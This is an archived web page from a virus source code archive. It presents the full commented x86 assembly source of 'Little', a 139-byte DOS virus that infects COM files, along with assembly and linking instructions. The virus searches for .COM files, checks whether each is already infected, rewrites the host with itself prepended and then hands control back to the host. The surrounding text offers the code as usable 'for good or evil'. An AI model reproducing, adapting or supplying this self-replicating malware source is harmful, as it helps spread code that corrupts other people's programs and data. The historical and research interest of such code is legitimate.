<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: little__asm</title>
<meta name="KEYWORDS" content="little_.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for little_.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="lamark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lamark_asm.php">lamark_asm</a><br>
<a href="lct_599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_599_asm.php">lct_599_asm</a><br>
<a href="lct-599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-599_asm.php">lct-599_asm</a><br>
<a href="lct_762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_762_asm.php">lct_762_asm</a><br>
<a href="lct-762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-762_asm.php">lct-762_asm</a><br>
<a href="leap-fro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leap-fro_asm.php">leap-fro_asm</a><br>
<a href="leapfrog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leapfrog_asm.php">leapfrog_asm</a><br>
<a href="leech__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech__asm.php">leech__asm</a><br>
<a href="leech_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech_asm.php">leech_asm</a><br>
<a href="lehi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehi_asm.php">lehi_asm</a><br>
<a href="lehigh___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh___asm.php">lehigh___asm</a><br>
<a href="lehigh__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh__asm.php">lehigh__asm</a><br>
<a href="lehigh_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh_asm.php">lehigh_asm</a><br>
<a href="lep-664a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lep-664a_asm.php">lep-664a_asm</a><br>
<a href="lepmisry_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lepmisry_asm.php">lepmisry_asm</a><br>
<a href="leprosb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosb2_asm.php">leprosb2_asm</a><br>
<a href="leprosy_2_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_2_c.php">leprosy_2_c</a><br>
<a href="leprosy_3_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_3_c.php">leprosy_3_c</a><br>
<a href="leprosy__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy__asm.php">leprosy__asm</a><br>
<a href="leprosyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyb_asm.php">leprosyb_asm</a><br>
<a href="leprosy_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_c.php">leprosy_c</a><br>
<a href="leprosyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyc_asm.php">leprosyc_asm</a><br>
<a href="leprsyb1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb1_asm.php">leprsyb1_asm</a><br>
<a href="leprsyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb_asm.php">leprsyb_asm</a><br>
<a href="leps808d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leps808d_asm.php">leps808d_asm</a><br>
<a href="leszop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leszop_asm.php">leszop_asm</a><br>
<a href="libertyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/libertyb_asm.php">libertyb_asm</a><br>
<a href="lisa__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa__asm.php">lisa__asm</a><br>
<a href="lisa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa_asm.php">lisa_asm</a><br>
<a href="lisbon2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisbon2_asm.php">lisbon2_asm</a><br>
<a href="lit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lit_asm.php">lit_asm</a><br>
<a href="littl139_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/littl139_asm.php">littl139_asm</a><br>
<a href="little__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/little__asm.php">little__asm</a><br>
<a href="load_sec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/load_sec_asm.php">load_sec_asm</a><br>
<a href="lock2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock2_asm.php">lock2_asm</a><br>
<a href="lock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock_asm.php">lock_asm</a><br>
<a href="lockjaw__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw__asm.php">lockjaw__asm</a><br>
<a href="lockjaw_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw_asm.php">lockjaw_asm</a><br>
<a href="lockout2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout2_asm.php">lockout2_asm</a><br>
<a href="lockout_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout_asm.php">lockout_asm</a><br>
<a href="loki1237_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki1237_asm.php">loki1237_asm</a><br>
<a href="loki_973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki_973_asm.php">loki_973_asm</a><br>
<a href="loki-973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki-973_asm.php">loki-973_asm</a><br>
<a href="lokjawd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawd_asm.php">lokjawd_asm</a><br>
<a href="lokjawz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawz_asm.php">lokjawz_asm</a><br>
<a href="lordzero_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lordzero_asm.php">lordzero_asm</a><br>
<a href="lqcancer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lqcancer_asm.php">lqcancer_asm</a><br>
<a href="ltbro299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro299_asm.php">ltbro299_asm</a><br>
<a href="ltbro307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro307_asm.php">ltbro307_asm</a><br>
<a href="ltbro321_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro321_asm.php">ltbro321_asm</a><br>
<a href="ltbrt299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbrt299_asm.php">ltbrt299_asm</a><br>
<a href="lythyum_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lythyum_asm.php">lythyum_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;A small (139 byte) virus with minimal required functionality.

;This Virus for research purposes only. Please do not release!
;Please execute it only on a carefully controlled system, and only
;if you know what you're doing!

;An example for

;#######################################################
;#    THE FIRST INTERNATIONAL VIRUS WRITING CONTEST    #
;#                        1 9 9 3                      #
;#######################################################

;Assemble this file with TASM 2.0 or higher: "TASM LITTLE;"
;Link as "TLINK /T LITTLE;"

;Basic explanation of how this virus works:
;
;The virus takes control when the program first starts up. All of its code is
;originally located at the start of a COM file that has been infected. When
;the virus starts, it takes over a segment 64K above the one where the program
;was loaded by DOS. It copies itself up there, and then searches for an
;uninfected file. To determine if a file is infected, it checks the first two
;bytes to see if they are the same as its first two bytes. It reads the file
;into memory right above where it is sitting (at 100H in the upper segment).
;If not already infected, it just writes itself plus the file it infected back
;out to disk under the same file name. Then it moves the host in the lower
;segment back to offset 100H and executes it.


                .model  tiny            ;Tiny model to create a COM file

                .code

;DTA definitions
DTA             EQU     0000H           ;Disk transfer area
FSIZE           EQU     DTA+1AH         ;file size location in file search
FNAME           EQU     DTA+1EH         ;file name location in file search


                ORG     100H

;******************************************************************************
;The virus starts here.

VIRSTART:
                mov     ax,ds
                add     ax,1000H
                mov     es,ax                           ;upper segment is this one + 1000H
                mov     si,100H                         ;put virus in the upper segment
                mov     di,si                           ;at offset 100H
;               mov     cl,BYTE (OFFSET HOST AND 0FFH)  ;can't code this with TASM
                mov     cl,8BH                          ;we can assume ch=0
                rep     movsb                           ;this will louse the infection up if run under debug!
                mov     ds,ax                           ;set ds to high segment
                push    ds
                mov     ax,OFFSET FIND_FILE
                push    ax
                retf                                    ;jump to high memory segment

;Now it's time to find a viable file to infect. We will look for any COM file
;and see if the virus is there already.
FIND_FILE:
                xor     dx,dx                           ;move dta to high segment
                mov     ah,1AH                          ;so we don't trash the command line
                int     21H                             ;which the host is expecting
                mov     dx,OFFSET COMFILE
                mov     ch,3FH                          ;search for any file, no matter what attribute (note: cx=0 before this instr)
                mov     ah,4EH                          ;DOS search first function
                int     21H
CHECK_FILE:     jc      ALLDONE                         ;no COM files to infect

                mov     dx,FNAME                        ;first open the file
                mov     ax,3D02H                        ;r/w access open file, since we'll want to write to it
                int     21H
                jc      NEXT_FILE                       ;error opening file - quit and say this file can't be used
                mov     bx,ax                           ;put file handle in bx, and leave it there for the duration

                mov     di,FSIZE
                mov     cx,[di]                         ;get file size for reading into buffer
                mov     dx,si                           ;and read file in at HOST in new segment (note si=OFFSET HOST)
                mov     ah,3FH                          ;DOS read function
                int     21H
                mov     ax,[si]                         ;si=OFFSET HOST here
                jc      NEXT_FILE                       ;skip file if error reading it

                cmp     ax,WORD PTR [VIRSTART]          ;see if infected already
                jnz     INFECT_FILE                     ;nope, go do it

                mov     ah,3EH                          ;else close the file
                int     21H                             ;and fall through to search for another file

NEXT_FILE:      mov     ah,4FH                          ;look for another file
                int     21H
                jmp     SHORT CHECK_FILE                ;and go check it out

COMFILE         DB      '*.COM',0

;When we get here, we've opened a file successfully, and read it into memory.
;In the high segment, the file is set up exactly as it will look when infected.
;Thus, to infect, we just rewrite the file from the start, using the image
;in the high segment.
INFECT_FILE:
                xor     cx,cx
                mov     dx,cx                           ;reset file pointer to start of file
                mov     ax,4200H
                int     21H

                mov     ah,40H
                mov     dx,100H
                mov     cx,WORD PTR [di]                ;adjust size of file for infection
                add     cx,OFFSET HOST - 100H
                int     21H                             ;write infected file

                mov     ah,3EH                          ;close the file
                int     21H

;The infection process is now complete. This routine moves the host program
;down so that its code starts at offset 100H, and then transfers control to it.
ALLDONE:
                mov     ax,ss                   ;set ds, es to low segment again
                mov     ds,ax
                mov     es,ax
                push    ax                      ;prep for retf to host
                shr     dx,1                    ;restore dta to original value
                mov     ah,1AH                  ;for compatibility
                int     21H
                mov     di,100H                 ;prep to move host back to original location
                push    di
;                mov     cx,sp                   ;move code, but don't trash the stack
;                sub     cx,si
                mov     cx,0FE6FH               ;hand code the above to save a byte
                rep     movsb                   ;move code
                retf                            ;and return to host

;******************************************************************************
;The host program starts here. This one is a dummy that just returns control
;to DOS.

HOST:
                mov     ax,4C00H                ;Terminate, error code = 0
                int     21H

HOST_END:

                END     VIRSTART





</textarea></td></tr></table></body></html>
